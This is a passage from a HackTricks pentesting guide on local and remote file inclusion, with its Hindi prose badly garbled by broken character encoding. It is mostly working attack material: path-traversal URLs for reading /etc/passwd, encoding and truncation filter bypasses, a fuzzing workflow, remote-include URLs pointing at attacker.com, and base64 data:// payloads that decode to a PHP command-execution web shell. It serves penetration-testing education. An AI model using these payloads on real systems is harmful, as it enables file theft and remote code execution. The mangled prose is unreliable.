# рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди/рдкрде рд╡рд┐рдЪрд╛рд░

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** **рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдореЗрдВ рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣реЛрддреА рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рддрднреА рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдмрдЧ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЖрдкрдХреЛ рдЗрдирд╛рдо рдорд┐рд▓реЗрдЧрд╛ред

**Web3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЗрд╕рдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ web3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**Web3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди

**рджреВрд░рд╕реНрде рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди (RFI):** рдлрд╝рд╛рдЗрд▓ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рд╕реЗ рд▓реЛрдб рд╣реЛрддреА рд╣реИ (рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда: рдЖрдк рдХреЛрдб рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛)ред PHP рдореЗрдВ рдпрд╣ **рдбрд┐рд╕реЗрдмрд▓** рд╣реЛрддрд╛ рд╣реИ (**allow\_url\_include**)ред\
**рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди (LFI):** рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рд╕рдВрдХрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╡рд┐рдХрд▓реНрдкрдиреАрдп **PHP рдлрд╝рдВрдХреНрд╢рдиреЗрдВ**: require, require\_once, include, include\_once

рдЗрд╕ рд╕рдВрдХрдЯ рдХреЛ рд╢реЛрдзрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЛрдЪрдХ рдЙрдкрдХрд░рдг: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## рдЕрдВрдз - рд░реЛрдЪрдХ - LFI2RCE рдлрд╝рд╛рдЗрд▓реЗрдВ
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**рдХрдИ \*nix LFI рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рдорд┐рд╢реНрд░рд┐рдд рдХрд░рдХреЗ рдФрд░ рдФрд░ рдкрдереЛрдВ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рдореИрдВрдиреЗ рдЗрд╕реЗ рдмрдирд╛рдпрд╛ рд╣реИ:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

рдЖрдк `/` рдХреЛ `\` рдХреЗ рд▓рд┐рдП рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ\
рдЖрдк `../../../../../` рднреА рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

рдПрдХ рд╕реВрдЪреА рдЬреЛ рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ /etc/password рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ (рд╡рд┐рдХрд▓реНрдкрддрд╛ рдореМрдЬреВрдж рд╣реЛрдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП) [рдпрд╣рд╛рдВ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### **Windows**

рдореИрдВрдиреЗ рдХрдИ рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рдорд┐рд╢реНрд░рд┐рдд рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рд╣реИ:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

рдЖрдк `/` рдХреЛ `\` рдХреЗ рд▓рд┐рдП рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ\
рдЖрдк `C:/` рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ `../../../../../` рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

рдПрдХ рд╕реВрдЪреА рдЬреЛ рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ /boot.ini рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ (рд╡рд┐рдХрд▓реНрдкрддрд╛ рдореМрдЬреВрдж рд╣реЛрдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП) [рдпрд╣рд╛рдВ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### **OS X**

Linux рдХреА LFI рд╕реВрдЪреА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

## рдмреЗрд╕рд┐рдХ LFI рдФрд░ рдмрд╛рдИрдкрд╛рд╕

рд╕рднреА рдЙрджрд╛рд╣рд░рдг рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд░рд┐рдореЛрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди (рдкреЗрдЬ=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/) ) рдореЗрдВ рднреА рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
http://example.com/index.php?page=../../../etc/passwd
```
### рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕реАрдХреНрд╡реЗрдВрд╕ рдЧреИрд░-рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХрд┐рдП рдЧрдП рд╣рдЯрд╛рдП рдЧрдП

рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕реАрдХреНрд╡реЗрдВрд╕ рдЧреИрд░-рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХрд┐рдП рдЧрдП рд╣рдЯрд╛рдП рдЧрдП рд╣реЛрддреЗ рд╣реИрдВред
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **рдирд▓ рдмрд╛рдЗрдЯ (%00)**

рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрдд рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рд╡рд░реНрдг рдЬреЛрдбрд╝реЗрдВ (рдмрд╛рдИрдкрд╛рд╕: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
рдпрд╣ **PHP 5.4 рд╕реЗ рд╣рд▓ рд╣реЛ рдЧрдпрд╛ рд╣реИ**

### **рдПрдирдХреЛрдбрд┐рдВрдЧ**

рдЖрдк рдбрдмрд▓ URL рдПрдирдХреЛрдб (рдФрд░ рдЕрдиреНрдп) рдЬреИрд╕реЗ рдЧреИрд░-рдорд╛рдирдХ рдПрдирдХреЛрдбрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### рдореМрдЬреВрджрд╛ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ

рд╢рд╛рдпрдж рдмреИрдХ-рдПрдВрдб рдлрд╝реЛрд▓реНрдбрд░ рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╝реЛрд▓реНрдбрд░ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛

рдЖрд╡реЗрджрдирд┐рдХ рдХреЛрдб / рдЕрдиреБрдорддрд┐ рджрд┐рдП рдЧрдП рд╡рд░реНрдгреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреА рдЦреЛрдЬ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕рдВрджрд░реНрднреАрдХрд░рдг рдХрд░реЗрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП:

* рдпрджрд┐ рдЖрдк рд▓рд┐рдирдХреНрд╕ рдкрд░ рд╣реИрдВ, рддреЛ `/etc/passwd` рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА "рдЧрд╣рдирддрд╛" рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ:
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдирд╛рдо рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП `/etc/passwd` рдкрд░ рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдирд╛рдо (рдпрд╣рд╛рдВ `private`) рдЬреЛрдбрд╝реЗрдВ:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрдордЬреЛрд░ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рджреЛ рдЕрд▓рдЧ рдкрд░рд┐рдгрд╛рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:
* рдпрджрд┐ рдЖрдкрдХреЛ рддреНрд░реБрдЯрд┐ / рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ `private` рдлрд╝реЛрд▓реНрдбрд░ рдЗрд╕ рд╕реНрдерд╛рди рдкрд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ
* рдпрджрд┐ рдЖрдк `/etc/passwd` рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдиреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдореМрдЬреВрджрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ `private` рдлрд╝реЛрд▓реНрдбрд░ рд╣реИ
* рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреЛрдЬреЗ рдЧрдП рдлрд╝реЛрд▓реНрдбрд░(рдУрдВ) рдХреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП (рдПрдХ рдХреНрд▓рд╛рд╕рд┐рдХ LFI рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рдпрд╛ рдЙрд╕реА рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдлрд╝рдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐, рдПрдХ рд╣реА рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЗ рддрд╣рдд (рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЧрд╣рд░рд╛рдИ 3 рдкрд░ рдореМрдЬреВрджрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛) рдЖрдк рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ `/var/www/` рдореЗрдВ `private` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдбреЛрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рд╕реЗ `sed` (1) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `ffuf` (2) рдЬреИрд╕реЗ URL рдлрдЬрд╝рд┐рд▓рдд рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
рдмреЗрд╢рдХ, рдЕрдкрдиреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдЧрд╣рд░рд╛рдИ / рд╕реНрдерд╛рди / рдЗрдирдкреБрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА рдореЗрдВ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░реЗрдВред

### **рдкрде рдХрдЯреМрддреА**

рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрдд рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд░реНрдгреЛрдВ рдХреЛ рдЫреЛрдбрд╝реЗрдВ (рдЫрд▓ рдХрд╛: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
рд╣рдореЗрд╢рд╛ рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ рдкрде рдХреЛ рдПрдХ рдирдХрд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ (a/) рдХреЗ рд╕рд╛рде **рд╢реБрд░реВ** рдХрд░реЗрдВред

**рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА PHP 5.3 рдореЗрдВ рд╕реБрдзрд╛рд░рд┐рдд рдХреА рдЧрдИ рдереАред**

### **рдлрд╝рд┐рд▓реНрдЯрд░ рдмрд╛рдИрдкрд╛рд╕ рдЯреНрд░рд┐рдХреНрд╕**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## рд░рд┐рдореЛрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

PHP рдореЗрдВ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`allow_url_include`** **рдмрдВрдж** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **рдЪрд╛рд▓реВ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ PHP рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **`allow_url_include`** **On** рд╣реИ, рд▓реЗрдХрд┐рди PHP рдмрд╛рд╣рд░реА рд╡реЗрдмрдкреЗрдЬреЛрдВ рдХрд╛ рдкрд╣реБрдВрдЪ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд░рд╣рд╛ рд╣реИ, [рдЗрд╕ рдкреЛрд╕реНрдЯ](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдмреЗрд╕64 рдХреЗ рд╕рд╛рде рдПрдХ b64 PHP рдХреЛрдб рдХреЛ рдбрд┐рдХреЛрдб рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ, рдЕрдВрддрд┐рдо `+.txt` рдЗрд╕рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдЬрд░реВрд░рдд рдереА рдЬреЛ `.txt` рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЙрд╕рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ рдФрд░ b64 рдбрд┐рдХреЛрдб рдХреЗ рдмрд╛рдж рдЙрд╕ рд╣рд┐рд╕реНрд╕реЗ рд╕реЗ рдХреЗрд╡рд▓ рдЬрдВрдХ рд▓реМрдЯреЗрдЧрд╛ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ PHP рдХреЛрдб рд╕рдореНрдорд┐рд▓рд┐рдд рд╣реЛрдЧрд╛ (рдФрд░ рдЗрд╕рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛)ред
{% endhint %}

рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг **`php://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рддреЗ рд╣реБрдП** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## рдкрд╛рдпрдерди рд░реВрдЯ рддрддреНрд╡

рдкрд╛рдпрдерди рдореЗрдВ рдЗрд╕ рддрд░рд╣ рдХреЗ рдХреЛрдб рдореЗрдВ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
